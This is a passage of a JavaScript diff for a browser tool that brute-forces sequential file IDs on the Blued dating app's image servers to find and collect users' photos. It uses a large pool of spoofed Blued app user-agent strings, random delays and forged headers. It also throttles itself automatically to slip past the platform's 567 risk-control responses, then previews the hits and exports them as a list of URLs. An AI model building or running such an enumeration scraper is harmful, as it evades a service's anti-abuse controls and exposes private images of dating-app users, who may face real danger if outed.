+    "Blued/7.45.7 (Linux; Android 15; 2404FDN63C)",
+    "Blued/7.45.7 (Linux; Android 15; 2404FDN63)",
+    "Blued/7.45.7 (Linux; Android 15; 23127PN52C)",
+    "Blued/7.45.7 (Linux; Android 15; PHKE10)",
+    "Blued/7.45.7 (Linux; Android 15; PHK110)",
+    "Blued/7.45.7 (Linux; Android 15; V2446)",
+    "Blued/7.45.7 (Linux; Android 15; V2424)",
+    "Blued/7.45.7 (Linux; Android 15; V2357A)",
+    "Blued/7.45.7 (Linux; Android 15; ZTEA7Ultra)",
+    "Blued/7.45.7 (Linux; Android 15; ZTEA31Ultra)",
+    "Blued/7.45.7 (Linux; Android 15; NX769J)",
+    "Blued/7.45.7 (Linux; Android 15; NX729J)",
+    "Blued/7.45.7 (Linux; Android 15; LE2120)",
+    "Blued/7.45.7 (Linux; Android 15; LE2121)",
+    "Blued/7.45.7 (Linux; Android 15; DT2002C)",
+    "Blued/7.45.7 (Linux; Android 15; MIX5)",
+    "Blued/7.45.7 (Linux; Android 15; MIX Fold 4)",
+    "Blued/7.45.7 (Linux; Android 15; 2201122C)",
+    "Blued/7.45.7 (Linux; Android 15; 2309FARN88)",
+    "Blued/7.45.7 (Linux; Android 15; POCO F7)",
+    "Blued/7.45.7 (Linux; Android 15; POCO X7)",
+    "Blued/7.45.7 (Linux; Android 15; Redmi Note 14 Pro)",
+    "Blued/7.45.7 (Linux; Android 15; Redmi Note 14)",
+    "Blued/7.45.7 (Linux; Android 15; realme GT7)",
+    "Blued/7.45.7 (Linux; Android 15; realme GT Neo6 SE)",
+    "Blued/7.45.7 (Linux; Android 15; ONEPLUS 13)",
+    "Blued/7.45.7 (Linux; Android 15; ONEPLUS 12)",
+    "Blued/7.45.7 (Linux; Android 15; vivo X200 Pro)",
+    "Blued/7.45.7 (Linux; Android 15; vivo X200)",
+    "Blued/7.45.7 (Linux; Android 15; vivo X100 Ultra)",
+    "Blued/7.45.7 (Linux; Android 15; iQOO 13)",
+    "Blued/7.45.7 (Linux; Android 15; iQOO 12)",
+    "Blued/7.45.7 (Linux; Android 15; OPPO Find X8 Ultra)",
+    "Blued/7.45.7 (Linux; Android 15; OPPO Find X8)",
+    "Blued/7.45.7 (Linux; Android 15; OPPO Reno14 Pro)",
+    "Blued/7.45.7 (Linux; Android 15; Honor Magic7 Pro)",
+    "Blued/7.45.7 (Linux; Android 15; Honor Magic7)",
+    "Blued/7.45.7 (Linux; Android 15; Honor 200 Pro)",
+    "Blued/7.45.6 (Linux; Android 15; Pixel 9 Pro)",
+    "Blued/7.45.6 (Linux; Android 15; Pixel 9)",
+    "Blued/7.45.6 (Linux; Android 15; Pixel 8 Pro)",
+    "Blued/7.45.6 (Linux; Android 15; Pixel 8)",
+    "Blued/7.45.6 (Linux; Android 15; Pixel Fold)",
+    "Blued/7.45.6 (Linux; Android 15; SM-S928B)",
+    "Blued/7.45.6 (Linux; Android 15; SM-S928U)",
+    "Blued/7.45.6 (Linux; Android 15; SM-S928N)",
+    "Blued/7.45.6 (Linux; Android 15; SM-F956B)",
+    "Blued/7.45.6 (Linux; Android 15; SM-F731B)",
+    "Blued/7.45.6 (Linux; Android 15; 2404FRDN63C)",
+    "Blued/7.45.6 (Linux; Android 15; 2404FDN63C)",
+    "Blued/7.45.6 (Linux; Android 15; 2404FDN63)",
+    "Blued/7.45.6 (Linux; Android 15; 23127PN52C)",
+    "Blued/7.45.6 (Linux; Android 15; PHKE10)",
+    "Blued/7.45.6 (Linux; Android 15; PHK110)",
+    "Blued/7.45.6 (Linux; Android 15; V2446)",
+    "Blued/7.45.6 (Linux; Android 15; V2424)",
+    "Blued/7.45.6 (Linux; Android 15; V2357A)",
+    "Blued/7.45.6 (Linux; Android 15; ZTEA7Ultra)",
+    "Blued/7.45.6 (Linux; Android 15; ZTEA31Ultra)",
+    "Blued/7.45.6 (Linux; Android 15; NX769J)",
+    "Blued/7.45.6 (Linux; Android 15; NX729J)",
+    "Blued/7.45.6 (Linux; Android 15; LE2120)",
+    "Blued/7.45.6 (Linux; Android 15; LE2121)",
+    "Blued/7.45.6 (Linux; Android 15; DT2002C)",
+    "Blued/7.45.6 (Linux; Android 15; MIX5)",
+    "Blued/7.45.6 (Linux; Android 15; MIX Fold 4)",
+    "Blued/7.45.6 (Linux; Android 15; 2201122C)",
+    "Blued/7.45.6 (Linux; Android 15; 2309FARN88)",
+    "Blued/7.45.6 (Linux; Android 15; POCO F7)",
+    "Blued/7.45.6 (Linux; Android 15; POCO X7)",
+    "Blued/7.45.6 (Linux; Android 15; Redmi Note 14 Pro)",
+    "Blued/7.45.6 (Linux; Android 15; Redmi Note 14)",
+    "Blued/7.45.6 (Linux; Android 15; realme GT7)",
+    "Blued/7.45.6 (Linux; Android 15; realme GT Neo6 SE)",
+    "Blued/7.45.6 (Linux; Android 15; ONEPLUS 13)",
+    "Blued/7.45.6 (Linux; Android 15; ONEPLUS 12)",
+    "Blued/7.45.6 (Linux; Android 15; vivo X200 Pro)",
+    "Blued/7.45.6 (Linux; Android 15; vivo X200)",
+    "Blued/7.45.6 (Linux; Android 15; vivo X100 Ultra)",
+    "Blued/7.45.6 (Linux; Android 15; iQOO 13)",
+    "Blued/7.45.6 (Linux; Android 15; iQOO 12)",
+    "Blued/7.45.6 (Linux; Android 15; OPPO Find X8 Ultra)",
+    "Blued/7.45.6 (Linux; Android 15; OPPO Find X8)",
+    "Blued/7.45.6 (Linux; Android 15; OPPO Reno14 Pro)",
+    "Blued/7.45.6 (Linux; Android 15; Honor Magic7 Pro)",
+    "Blued/7.45.6 (Linux; Android 15; Honor Magic7)",
+    "Blued/7.45.6 (Linux; Android 15; Honor 200 Pro)",
+    "Blued/7.45.5 (Linux; Android 15; Pixel 9 Pro)",
+    "Blued/7.45.5 (Linux; Android 15; Pixel 9)",
+    "Blued/7.45.5 (Linux; Android 15; Pixel 8 Pro)",
+    "Blued/7.45.5 (Linux; Android 15; Pixel 8)",
+    "Blued/7.45.5 (Linux; Android 15; Pixel Fold)",
+    "Blued/7.45.5 (Linux; Android 15; SM-S928B)",
+    "Blued/7.45.5 (Linux; Android 15; SM-S928U)",
+    "Blued/7.45.5 (Linux; Android 15; SM-S928N)",
+    "Blued/7.45.5 (Linux; Android 15; SM-F956B)",
+    "Blued/7.45.5 (Linux; Android 15; SM-F731B)",
+    "Blued/7.45.5 (Linux; Android 15; 2404FRDN63C)",
+    "Blued/7.45.5 (Linux; Android 15; 2404FDN63C)",
+    "Blued/7.45.5 (Linux; Android 15; 2404FDN63)",
+    "Blued/7.45.5 (Linux; Android 15; 23127PN52C)",
+    "Blued/7.45.5 (Linux; Android 15; PHKE10)",
+    "Blued/7.45.5 (Linux; Android 15; PHK110)",
+    "Blued/7.45.5 (Linux; Android 15; V2446)",
+    "Blued/7.45.5 (Linux; Android 15; V2424)",
+    "Blued/7.45.5 (Linux; Android 15; V2357A)",
+    "Blued/7.45.5 (Linux; Android 15; ZTEA7Ultra)",
+    "Blued/7.45.5 (Linux; Android 15; ZTEA31Ultra)",
+    "Blued/7.45.5 (Linux; Android 15; NX769J)",
+    "Blued/7.45.5 (Linux; Android 15; NX729J)",
+    "Blued/7.45.5 (Linux; Android 15; LE2120)",
+    "Blued/7.45.5 (Linux; Android 15; LE2121)",
+    "Blued/7.45.5 (Linux; Android 15; DT2002C)",
+    "Blued/7.45.5 (Linux; Android 15; MIX5)",
+    "Blued/7.45.5 (Linux; Android 15; MIX Fold 4)",
+    "Blued/7.45.5 (Linux; Android 15; 2201122C)",
+    "Blued/7.45.5 (Linux; Android 15; 2309FARN88)",
+    "Blued/7.45.5 (Linux; Android 15; POCO F7)",
+    "Blued/7.45.5 (Linux; Android 15; POCO X7)",
+    "Blued/7.45.5 (Linux; Android 15; Redmi Note 14 Pro)",
+    "Blued/7.45.5 (Linux; Android 15; Redmi Note 14)",
+    "Blued/7.45.5 (Linux; Android 15; realme GT7)",
+    "Blued/7.45.5 (Linux; Android 15; realme GT Neo6 SE)",
+    "Blued/7.45.5 (Linux; Android 15; ONEPLUS 13)",
+    "Blued/7.45.5 (Linux; Android 15; ONEPLUS 12)",
+    "Blued/7.45.5 (Linux; Android 15; vivo X200 Pro)",
+    "Blued/7.45.5 (Linux; Android 15; vivo X200)",
+    "Blued/7.45.5 (Linux; Android 15; vivo X100 Ultra)",
+    "Blued/7.45.5 (Linux; Android 15; iQOO 13)",
+    "Blued/7.45.5 (Linux; Android 15; iQOO 12)",
+    "Blued/7.45.5 (Linux; Android 15; OPPO Find X8 Ultra)",
+    "Blued/7.45.5 (Linux; Android 15; OPPO Find X8)",
+    "Blued/7.45.5 (Linux; Android 15; OPPO Reno14 Pro)",
+    "Blued/7.45.5 (Linux; Android 15; Honor Magic7 Pro)",
+    "Blued/7.45.5 (Linux; Android 15; Honor Magic7)",
+    "Blued/7.45.5 (Linux; Android 15; Honor 200 Pro)",
+    "Blued/7.45.4 (Linux; Android 15; Pixel 9 Pro)",
+    "Blued/7.45.4 (Linux; Android 15; Pixel 9)",
+    "Blued/7.45.4 (Linux; Android 15; Pixel 8 Pro)",
+    "Blued/7.45.4 (Linux; Android 15; Pixel 8)",
+    "Blued/7.45.4 (Linux; Android 15; Pixel Fold)",
+    "Blued/7.45.4 (Linux; Android 15; SM-S928B)",
+    "Blued/7.45.4 (Linux; Android 15; SM-S928U)",
+    "Blued/7.45.4 (Linux; Android 15; SM-S928N)",
+    "Blued/7.45.4 (Linux; Android 15; SM-F956B)",
+    "Blued/7.45.4 (Linux; Android 15; SM-F731B)",
+    "Blued/7.45.4 (Linux; Android 15; 2404FRDN63C)",
+    "Blued/7.45.4 (Linux; Android 15; 2404FDN63C)",
+    "Blued/7.45.4 (Linux; Android 15; 2404FDN63)",
+    "Blued/7.45.4 (Linux; Android 15; 23127PN52C)",
+    "Blued/7.45.4 (Linux; Android 15; PHKE10)",
+    "Blued/7.45.4 (Linux; Android 15; PHK110)",
+    "Blued/7.45.4 (Linux; Android 15; V2446)",
+    "Blued/7.45.4 (Linux; Android 15; V2424)",
+    "Blued/7.45.4 (Linux; Android 15; V2357A)",
+    "Blued/7.45.4 (Linux; Android 15; ZTEA7Ultra)",
+    "Blued/7.45.4 (Linux; Android 15; ZTEA31Ultra)",
+    "Blued/7.45.4 (Linux; Android 15; NX769J)",
+    "Blued/7.45.4 (Linux; Android 15; NX729J)",
+    "Blued/7.45.4 (Linux; Android 15; LE2120)",
+    "Blued/7.45.4 (Linux; Android 15; LE2121)",
+    "Blued/7.45.4 (Linux; Android 15; DT2002C)",
+    "Blued/7.45.4 (Linux; Android 15; MIX5)",
+    "Blued/7.45.4 (Linux; Android 15; MIX Fold 4)",
+    "Blued/7.45.4 (Linux; Android 15; 2201122C)",
+    "Blued/7.45.4 (Linux; Android 15; 2309FARN88)",
+    "Blued/7.45.4 (Linux; Android 15; POCO F7)",
+    "Blued/7.45.4 (Linux; Android 15; POCO X7)",
+    "Blued/7.45.4 (Linux; Android 15; Redmi Note 14 Pro)",
+    "Blued/7.45.4 (Linux; Android 15; Redmi Note 14)",
+    "Blued/7.45.4 (Linux; Android 15; realme GT7)",
+    "Blued/7.45.4 (Linux; Android 15; realme GT Neo6 SE)",
+    "Blued/7.45.4 (Linux; Android 15; ONEPLUS 13)",
+    "Blued/7.45.4 (Linux; Android 15; ONEPLUS 12)",
+    "Blued/7.45.4 (Linux; Android 15; vivo X200 Pro)",
+    "Blued/7.45.4 (Linux; Android 15; vivo X200)",
+    "Blued/7.45.4 (Linux; Android 15; vivo X100 Ultra)",
+    "Blued/7.45.4 (Linux; Android 15; iQOO 13)",
+    "Blued/7.45.4 (Linux; Android 15; iQOO 12)",
+    "Blued/7.45.4 (Linux; Android 15; OPPO Find X8 Ultra)",
+    "Blued/7.45.4 (Linux; Android 15; OPPO Find X8)",
+    "Blued/7.45.4 (Linux; Android 15; OPPO Reno14 Pro)",
+    "Blued/7.45.4 (Linux; Android 15; Honor Magic7 Pro)",
+    "Blued/7.45.4 (Linux; Android 15; Honor Magic7)",
+    "Blued/7.45.4 (Linux; Android 15; Honor 200 Pro)",
+    "Blued/7.26.5 (Linux; Android 14; Pixel 7 Pro)",
+    "Blued/7.26.5 (Linux; Android 14; Pixel 7)",
+    "Blued/7.26.5 (Linux; Android 14; Pixel 6a)",
+    "Blued/7.26.5 (Linux; Android 14; SM-S918B)",
+    "Blued/7.26.5 (Linux; Android 14; SM-S918U)",
+    "Blued/7.26.5 (Linux; Android 14; SM-F946B)",
+    "Blued/7.26.5 (Linux; Android 14; 2304FPN6DC)",
+    "Blued/7.26.5 (Linux; Android 14; 2304FPN6D)",
+    "Blued/7.26.5 (Linux; Android 14; 22101316C)",
+    "Blued/7.26.5 (Linux; Android 14; V2243A)",
+    "Blued/7.26.5 (Linux; Android 14; V2232A)",
+    "Blued/7.26.5 (Linux; Android 14; ZTEA2023G)",
+    "Blued/7.26.5 (Linux; Android 14; NX729J)",
+    "Blued/7.26.5 (Linux; Android 14; LE2110)",
+    "Blued/7.26.5 (Linux; Android 14; DT1002C)",
+    "Blued/7.26.5 (Linux; Android 14; MIX Fold 3)",
+    "Blued/7.26.5 (Linux; Android 14; Redmi Note 13 Pro)",
+    "Blued/7.26.5 (Linux; Android 14; realme GT Neo5)",
+    "Blued/7.26.5 (Linux; Android 14; ONEPLUS 11)",
+    "Blued/7.26.5 (Linux; Android 14; vivo X100 Pro)",
+    "Blued/7.26.5 (Linux; Android 14; iQOO 11)",
+    "Blued/7.26.5 (Linux; Android 14; OPPO Find X7 Ultra)",
+    "Blued/7.26.5 (Linux; Android 14; OPPO Reno13 Pro)",
+    "Blued/7.26.5 (Linux; Android 14; Honor Magic6 Pro)",
+    "Blued/7.26.4 (Linux; Android 14; Pixel 7 Pro)",
+    "Blued/7.26.4 (Linux; Android 14; Pixel 7)",
+    "Blued/7.26.4 (Linux; Android 14; Pixel 6a)",
+    "Blued/7.26.4 (Linux; Android 14; SM-S918B)",
+    "Blued/7.26.4 (Linux; Android 14; SM-S918U)",
+    "Blued/7.26.4 (Linux; Android 14; SM-F946B)",
+    "Blued/7.26.4 (Linux; Android 14; 2304FPN6DC)",
+    "Blued/7.26.4 (Linux; Android 14; 2304FPN6D)",
+    "Blued/7.26.4 (Linux; Android 14; 22101316C)",
+    "Blued/7.26.4 (Linux; Android 14; V2243A)",
+    "Blued/7.26.4 (Linux; Android 14; V2232A)",
+    "Blued/7.26.4 (Linux; Android 14; ZTEA2023G)",
+    "Blued/7.26.4 (Linux; Android 14; NX729J)",
+    "Blued/7.26.4 (Linux; Android 14; LE2110)",
+    "Blued/7.26.4 (Linux; Android 14; DT1002C)",
+    "Blued/7.26.4 (Linux; Android 14; MIX Fold 3)",
+    "Blued/7.26.4 (Linux; Android 14; Redmi Note 13 Pro)",
+    "Blued/7.26.4 (Linux; Android 14; realme GT Neo5)",
+    "Blued/7.26.4 (Linux; Android 14; ONEPLUS 11)",
+    "Blued/7.26.4 (Linux; Android 14; vivo X100 Pro)",
+    "Blued/7.26.4 (Linux; Android 14; iQOO 11)",
+    "Blued/7.26.4 (Linux; Android 14; OPPO Find X7 Ultra)",
+    "Blued/7.26.4 (Linux; Android 14; OPPO Reno13 Pro)",
+    "Blued/7.26.4 (Linux; Android 14; Honor Magic6 Pro)",
+]));
+
+// 100%对齐Python的域名列表
 const DOMAIN_LIST = [
     "https://qn-origin-blued.bldimg.com",
     "https://www.bldimg.com",
     "https://www.bldimg.cn"
 ];
-const SUFFIX_FULL = ["!original.png","!Head.jpg!original.png","!Head.jpg",""];
-const SUFFIX_SPLIT = ["!original.png","!Head.jpg"];
 
-let filePath = "";
-let startId = 0, endId = 0;
-let processed = 0, successCount = 0, failCount = 0;
-let mode = "full";
+// 100%对齐Python的后缀优先级
+const SUFFIX_CONFIG = {
+    full: ["!original.png", "!Head.jpg!original.png", "!Head.jpg", ""],
+    split: ["!original.png", "!Head.jpg"]
+};
 
-const logDom = document.getElementById('log');
-const fillDom = document.getElementById('fill');
-const doneDom = document.getElementById('done');
-const succDom = document.getElementById('succ');
-const failDom = document.getElementById('fail');
-const startBtn = document.getElementById('startBtn');
+// 100%对齐Python的单域名并发限制
+const BASE_DOMAIN_LIMITS = {
+    "qn-origin-blued.bldimg.com": 20,
+    "www.bldimg.com": 20,
+    "www.bldimg.cn": 40
+};
 
-document.querySelectorAll('.option-btn').forEach(btn=>{
-    btn.onclick=()=>{
-        document.querySelectorAll('.option-btn').forEach(b=>b.classList.remove('active'));
-        btn.classList.add('active');
-        mode=btn.dataset.mode;
+// 全局状态管理
+const state = {
+    filePath: "",
+    startId: 0,
+    endId: 0,
+    totalTask: 0,
+    processed: 0,
+    successCount: 0,
+    failureCount: 0,
+    taskStartTime: 0,
+    isRunning: false,
+    mode: "full",
+    progressTimer: null,
+    continuousRisk567: 0,
+    continuousNormalRequest: 0,
+    currentConcurrency: CONFIG.BASE_CONCURRENCY,
+    domainSemaphores: {},
+    successfulUrls: [],
+    failedUrls: [],
+    retryUrlList: [],
+    isRetrying: false,
+    retryProcessed: 0,
+    retryTotal: 0,
+    retrySuccessCount: 0,
+    retryFailCount: 0,
+    retryStartTime: 0
+};
+
+// DOM元素缓存
+const dom = {
+    log: document.getElementById('log'),
+    progressFill: document.getElementById('progressFill'),
+    processedCount: document.getElementById('processedCount'),
+    successCount: document.getElementById('successCount'),
+    failureCount: document.getElementById('failureCount'),
+    speed: document.getElementById('speed'),
+    eta: document.getElementById('eta'),
+    hitRate: document.getElementById('hitRate'),
+    startBtn: document.getElementById('startBtn'),
+    stopBtn: document.getElementById('stopBtn'),
+    retryBtn: document.getElementById('retryBtn'),
+    previewGrid: document.getElementById('previewGrid'),
+    urlVal: document.getElementById('urlVal'),
+    startId: document.getElementById('startId'),
+    endId: document.getElementById('endId'),
+    exportBtn: document.getElementById('exportBtn')
+};
+
+// 工具函数
+const getRandomUA = () => UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
+const randomJitter = () => new Promise(resolve => setTimeout(resolve, Math.random() * (CONFIG.JITTER_MAX - CONFIG.JITTER_MIN) + CONFIG.JITTER_MIN));
+const extractFilePath = (url) => {
+    const reg = /\/userfiles\/(\d+\/\d+\/\d+)\/\d+/;
+    const res = url.match(reg);
+    return res ? res[1] : null;
+};
+const buildUrls = (id) => {
+    const urls = [];
+    const suffixList = SUFFIX_CONFIG[state.mode];
+    const shuffledDomains = [...DOMAIN_LIST].sort(() => Math.random() - 0.5);
+    for (const suf of suffixList) {
+        for (const dom of shuffledDomains) {
+            urls.push(`${dom}/userfiles/${state.filePath}/${id}${suf}`);
+        }
     }
-});
+    return urls;
+};
 
-function randUA(){
-    const arr=[
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
-        "Mozilla/5.0 (Android 14; Pixel 8)",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome 124.0"
-    ];
-    return arr[Math.floor(Math.random()*arr.length)];
+// 图片有效性校验 100%对齐Python
+const isValidImage = async (arrayBuffer) => {
+    if (!arrayBuffer || arrayBuffer.byteLength < 80) return false;
+    const uint8 = new Uint8Array(arrayBuffer);
+    const head = uint8.slice(0, 32);
+    if (head[0] === 0x89 && head[1] === 0x50 && head[2] === 0x4E && head[3] === 0x47) return true;
+    if (head[0] === 0xFF && head[1] === 0xD8 && head[2] === 0xFF) return true;
+    if ((head[0] === 0x47 && head[1] === 0x49 && head[2] === 0x46 && head[3] === 0x38 && (head[4] === 0x37 || head[4] === 0x39) && head[5] === 0x61)) return true;
+    if (uint8.slice(8, 12).every((v, i) => v === [0x57, 0x45, 0x42, 0x50][i])) return true;
+    return false;
+};
+
+// 信号量实现
+class Semaphore {
+    constructor(limit) {
+        this.limit = limit;
+        this.count = 0;
+        this.queue = [];
+    }
+    async acquire() {
+        if (this.count < this.limit) {
+            this.count++;
+            return Promise.resolve();
+        }
+        return new Promise(resolve => this.queue.push(resolve));
+    }
+    release() {
+        this.count--;
+        if (this.queue.length > 0) {
+            this.count++;
+            const resolve = this.queue.shift();
+            resolve();
+        }
+    }
 }
 
-// 文字+查看按钮（修复无效问题）
-function addLog(id,link){
+// 单域名信号量初始化
+const initDomainSemaphores = () => {
+    state.domainSemaphores = {};
+    for (const [domain, limit] of Object.entries(BASE_DOMAIN_LIMITS)) {
+        state.domainSemaphores[domain] = new Semaphore(limit);
+    }
+};
+
+// 动态并发风控逻辑 100%对齐Python
+const adjustConcurrencyOnRisk = async () => {
+    state.continuousRisk567++;
+    state.continuousNormalRequest = 0;
+    if (state.continuousRisk567 >= CONFIG.RISK_TRIGGER_COUNT) {
+        const newConcurrency = Math.max(Math.floor(state.currentConcurrency * 0.6), 20);
+        if (newConcurrency !== state.currentConcurrency) {
+            state.currentConcurrency = newConcurrency;
+            for (const [domain, sem] of Object.entries(state.domainSemaphores)) {
+                const newLimit = Math.max(Math.floor(BASE_DOMAIN_LIMITS[domain] * 0.6), 10);
+                state.domainSemaphores[domain] = new Semaphore(newLimit);
+            }
+            addWarningLog(`[567风控触发] 已自动降低并发至: ${state.currentConcurrency}`);
+        }
+        state.continuousRisk567 = 0;
+    }
+};
+const adjustConcurrencyOnNormal = async () => {
+    state.continuousNormalRequest++;
+    state.continuousRisk567 = 0;
+    if (state.continuousNormalRequest >= CONFIG.RISK_RECOVER_COUNT) {
+        const newConcurrency = Math.min(Math.floor(state.currentConcurrency * 1.4), CONFIG.BASE_CONCURRENCY);
+        if (newConcurrency !== state.currentConcurrency) {
+            state.currentConcurrency = newConcurrency;
+            for (const [domain, sem] of Object.entries(state.domainSemaphores)) {
+                const newLimit = Math.min(Math.floor(BASE_DOMAIN_LIMITS[domain] * 1.4), BASE_DOMAIN_LIMITS[domain]);
+                state.domainSemaphores[domain] = new Semaphore(newLimit);
+            }
+            addSuccessLog(`[风控缓解] 已自动恢复并发至: ${state.currentConcurrency}`);
+        }
+        state.continuousNormalRequest = 0;
+    }
+};
+
+// 567二次探测逻辑 100%对齐Python
+const secondProbe = async (url, host) => {
+    let lastResponse = null;
+    for (let retryTimes = 0; retryTimes < CONFIG.MAX_567_RETRY; retryTimes++) {
+        const delay = CONFIG.RETRY_DELAY_BASE * (retryTimes + 1);
+        await new Promise(resolve => setTimeout(resolve, delay * (0.8 + Math.random() * 0.4)));
+        const headers = {
+            "Host": host,
+            "User-Agent": getRandomUA(),
+            "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
+            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Referer": `https://${host}/`,
+            "Cache-Control": "no-cache",
+            "Pragma": "no-cache"
+        };
+        try {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), CONFIG.REQUEST_TIMEOUT);
+            const res = await fetch(url, {
+                headers,
+                signal: controller.signal,
+                mode: "cors",
+                cache: "no-cache",
+                redirect: CONFIG.FOLLOW_REDIRECTS ? "follow" : "manual"
+            });
+            clearTimeout(timeout);
+            lastResponse = res;
+            if (res.status !== 567) break;
+        } catch {
+            continue;
+        }
+    }
+    return lastResponse;
+};
+
+// ====================== 核心修复：缩略图渲染+单击跳转 ======================
+const addPreviewThumb = (originUrl, id) => {
+    // 先移除空提示
+    const emptyTip = dom.previewGrid.querySelector('.empty-tip');
+    if (emptyTip) emptyTip.remove();
+    
+    // 去重判断
+    const isExist = state.successfulUrls.includes(originUrl);
+    if (isExist) return;
+
+    // 创建缩略图元素
+    const thumb = document.createElement('div');
+    thumb.className = "preview-thumb";
+    thumb.title = `ID${id} 点击查看原图`;
+    // 直接使用原始URL渲染背景图
+    thumb.style.backgroundImage = `url("${originUrl}")`;
+    
+    // 【修复】单击跳转 — WKWebView 兼容，直接跳转而非新窗口
+    thumb.addEventListener('click', () => {
+        window.location.href = originUrl;
+    }, { passive: true });
+    
+    // 仅保留加载失败报错 移除所有成功提示
+    thumb.onerror = () => {
+        thumb.style.backgroundColor = "var(--bg-blur-base)";
+        addErrorLog(`ID${id} 预览图加载失败`);
+    };
+
+    // 追加到预览区
+    dom.previewGrid.appendChild(thumb);
+
+    // 启用导出按钮
+    dom.exportBtn.disabled = false;
+};
+
+// 导出URL TXT函数 无修改
+const exportUrlsToTxt = () => {
+    const uniqueUrls = [...new Set(state.successfulUrls)].sort((a, b) => {
+        const idA = a.match(/\/(\d+)(?:!|$)/)?.[1] || 0;
+        const idB = b.match(/\/(\d+)(?:!|$)/)?.[1] || 0;
+        return idA - idB;
+    });
+
+    if (uniqueUrls.length === 0) {
+        addErrorLog("导出失败：暂无成功图片URL");
+        return;
+    }
+
+    const txtContent = uniqueUrls.join('\n');
+    const blob = new Blob([txtContent], { type: 'text/plain;charset=utf-8' });
+    const downloadUrl = URL.createObjectURL(blob);
+
+    const aTag = document.createElement('a');
+    const timestamp = new Date().toLocaleString().replace(/[/:\s]/g, '-');
+    aTag.download = `Blued_成功图片_URL_${timestamp}.txt`;
+    aTag.href = downloadUrl;
+    aTag.style.display = 'none';
+
+    document.body.appendChild(aTag);
+    aTag.click();
+    document.body.removeChild(aTag);
+    URL.revokeObjectURL(downloadUrl);
+
+    addSuccessLog(`✅ 导出成功！共导出 ${uniqueUrls.length} 条图片URL`);
+};
+
+// 日志函数 无修改
+const addSuccessLog = (text) => {
+    const line = document.createElement('div');
+    line.className = "log-line log-success";
+    line.innerText = text;
+    dom.log.appendChild(line);
+    dom.log.scrollTop = dom.log.scrollHeight;
+};
+const addErrorLog = (text) => {
+    const line = document.createElement('div');
+    line.className = "log-line log-error";
+    line.innerText = text;
+    dom.log.appendChild(line);
+    dom.log.scrollTop = dom.log.scrollHeight;
+};
+const addWarningLog = (text) => {
+    const line = document.createElement('div');
+    line.className = "log-line log-warning";
+    line.innerText = text;
+    dom.log.appendChild(line);
+    dom.log.scrollTop = dom.log.scrollHeight;
+};
+const addInfoLog = (text) => {
+    const line = document.createElement('div');
+    line.className = "log-line log-info";
+    line.innerText = text;
+    dom.log.appendChild(line);
+    dom.log.scrollTop = dom.log.scrollHeight;
+};
+const addPlainLog = (text) => {
     const line = document.createElement('div');
     line.className = "log-line";
-    const text = document.createTextNode(`ID${id}`);
-    const btn = document.createElement('button');
-    btn.className = "view-btn";
-    btn.innerText = "查看";
-    // 关键：_blank 新标签，配合meta no-referrer
-    btn.onclick = ()=>window.open(link, '_blank');
-    line.appendChild(text);
-    line.appendChild(btn);
-    logDom.appendChild(line);
-    logDom.scrollTop = logDom.scrollHeight;
-}
-
-function addPlain(text){
-    const d = document.createElement('div');
-    d.style.margin="4px 0";
-    d.style.color="#888";
-    d.innerText = text;
-    logDom.appendChild(d);
-    logDom.scrollTop = logDom.scrollHeight;
-}
-
-function resetData(){
-    processed=0;successCount=0;failCount=0;
-    fillDom.style.width="0%";
-    doneDom.innerText=0;succDom.innerText=0;failDom.innerText=0;
-    logDom.innerHTML="";
-}
-function getPath(url){
-    let reg=/\/userfiles\/(\d+\/\d+\/\d+)\/\d+/;
-    let res=url.match(reg);
-    return res?res[1]:null;
-}
-function buildUrls(id){
-    let arr=[];
-    let list=mode==="full"?SUFFIX_FULL:SUFFIX_SPLIT;
-    for(let d of DOMAIN_LIST){
-        for(let s of list){
-            arr.push(`${d}/userfiles/${filePath}/${id}${s}`);
-        }
-    }
-    return arr;
-}
-
-async function checkUrl(url){
-    let h={UserAgent:randUA()};
-    let c=new AbortController();
-    let t=setTimeout(()=>c.abort(),TIMEOUT);
-    try{
-        let res=await fetch(url,{headers:h,signal:c.signal});
-        clearTimeout(t);
-        if([403,429,503,567].includes(res.status)){
-            await new Promise(r=>setTimeout(r,200));
-            let res2=await fetch(url,{headers:h,signal:c.signal});
-            return res2.ok;
-        }
-        return res.ok;
-    }catch{
-        clearTimeout(t);
-        return false;
-    }
-}
-
-async function scanId(id,total){
-    let urls=buildUrls(id);
-    let ok=false,okUrl="";
-    for(let u of urls){
-        if(await checkUrl(u)){ok=true;okUrl=u;break;}
-    }
-
-    processed++;
-    doneDom.innerText=processed;
-    let pct=(processed/total)*100;
-    fillDom.style.width=pct+"%";
-
-    if(ok){
-        successCount++;
-        succDom.innerText=successCount;
-        addLog(id,okUrl);
-    }else{
-        failCount++;
-    }
-}
-
-async function runPool(tasks,limit){
-    let idx=0;
-    async function fn(){
-        while(idx<tasks.length)await tasks[idx++];
-    }
-    let pool=Array(limit).fill(0).map(()=>fn());
-    await Promise.all(pool);
-}
-
-startBtn.onclick=async ()=>{
-    resetData();
-    let url=document.getElementById('urlVal').value.trim();
-    startId=+document.getElementById('startId').value;
-    endId=+document.getElementById('endId').value;
-
-    filePath=getPath(url);
-    if(!filePath){addPlain("错误！请检查URL格式是否正确粘贴");return;}
-    addPlain("开始爆破");
-    startBtn.disabled=true;
-    startBtn.innerText="爆破中...";
-
-    let total=endId-startId+1;
-    let tasks=[];
-    for(let i=startId;i<=endId;i++)tasks.push(scanId(i,total));
-    await runPool(tasks,CONCUR);
-
-    addPlain(`扫描结束失败总数：${failCount}`);
-    failDom.innerText=failCount;
-    startBtn.disabled=false;
-    startBtn.innerText="START";
+    line.innerText = text;
+    dom.log.appendChild(line);
+    dom.log.scrollTop = dom.log.scrollHeight;
 };
+
+// 重试按钮状态控制 无修改
+const updateRetryBtnState = (status, text, smallText) => {
+    dom.retryBtn.className = "mode-btn";
+    dom.retryBtn.innerHTML = `${text}<br><small>${smallText}</small>`;
+    
+    switch(status) {
+        case "disabled":
+            dom.retryBtn.disabled = true;
+            break;
+        case "ready":
+            dom.retryBtn.disabled = false;
+            dom.retryBtn.classList.add("retry-ready");
+            break;
+        case "running":
+            dom.retryBtn.disabled = true;
